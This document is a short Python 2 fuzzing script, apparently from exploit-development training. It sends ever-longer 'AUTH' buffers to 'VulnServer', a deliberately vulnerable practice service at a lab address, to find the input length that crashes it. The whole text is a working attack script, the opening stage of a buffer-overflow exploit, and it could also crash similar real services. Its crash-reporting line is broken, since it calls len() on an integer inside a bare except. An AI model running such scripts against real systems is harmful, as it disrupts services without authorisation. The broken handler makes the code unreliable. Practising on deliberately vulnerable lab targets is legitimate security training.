#!/usr/bin/python
import socket
import time

buffer = ["A"]
counter = 100

while len(buffer) <= 40:
	buffer.append("A" * counter)
	counter = counter + 100
try:
	for string in buffer:
		print "[x] Throwing {} bytes at VulnServer".format(len(string))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(("10.11.22.183", 5555))
		s.send("AUTH {}".format(string))
		s.close()
		time.sleep(1)
except:
	print "[!] Crashed with {} bytes".format(len(counter))
